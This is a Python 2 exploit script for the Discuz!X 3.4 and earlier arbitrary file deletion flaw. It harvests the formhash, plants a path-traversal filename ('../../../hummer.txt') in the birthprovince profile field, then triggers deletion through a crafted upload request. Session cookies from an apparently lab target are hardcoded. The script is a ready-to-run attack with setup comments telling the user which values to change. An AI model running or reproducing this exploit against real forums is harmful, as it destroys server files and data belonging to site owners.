# -*- coding: utf-8 -*- 
# @Time : 2022/4/1 16:22 
# @Author : hummer
# @File : Discuz.py

import requests
import re

'''
Discuz!X <=3.4 任意文件删除漏洞
'''
def get_cookie():
   cookies={}
   for line in raw_cookies.split(';'):  
       key,value=line.split('=',1)
       cookies[key]=value 
   return cookies
def get_formhash(url):
   cookies=get_cookie()
   testurl=url+"/home.php?mod=spacecp"  
   s=requests.get(testurl,cookies=cookies)
   com = re.compile('<input type="hidden" name="formhash" value="(.*?)" />')
   result = com.findall(s.text)
   return result[0]
def del_step1(url,filename):
   headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
   geturl=url+"/home.php?mod=spacecp&ac=profile&op=base"
   formhash=get_formhash(url)
   payload ={'birthprovince':filename,"profilesubmit":1,"formhash":formhash}
   cookies=get_cookie()
   r = requests.post(geturl,data=payload,headers=headers,cookies=cookies)
   if r.content.find('parent.show_success')>0:
       print 'Step1 success!!!'
def del_step2(url):
   geturl=url+"/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa"
   heads={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
   formhash=get_formhash(url)
   files ={'formhash':(None,formhash),'birthprovince':('1.jpg',open('1.jpg','rb'),'image/jpeg'),'profilesubmit':(None,'1')}
   cookies=get_cookie()
   r=requests.post(geturl,files=files,headers=heads,cookies=cookies)
   if r.text.find('parent.show_success')>0:
       print 'Step2 success!!!'
       
if __name__ == '__main__':
   #需要修改以下三个参数：
   #1、设置cookie
   raw_cookies="F2FT_2132_saltkey=io24YPxM; F2FT_2132_lastvisit=1648809351; F2FT_2132_sid=fF7TVn; F2FT_2132_lastact=1648813727%09misc.php%09patch; F2FT_2132_ulastactivity=339cIoUmJOxd%2Bch%2B6dbQCq3abIox4TNd%2FhNwWVHTJ1wjbfQugifq; F2FT_2132_auth=5865Mwlnc5gASsjPNihpyMFRUIksz8r3ooKYps%2FYRpYZkIT%2FMq1iBNE5frlcQZacv5djo8W5lLVVjzVlLeL%2B; F2FT_2132_lastcheckfeed=2%7C1648813039; F2FT_2132_nofavfid=1; F2FT_2132_onlineusernum=6; F2FT_2132_sendmail=1; F2FT_2132_lip=10.10.10.1%2C1648813039"
   #2、设置删除的文件
   filename="../../../hummer.txt"  
   #3、设置url
   url="http://10.10.10.143/Discuz"
   del_step1(url,filename)    
   del_step2(url)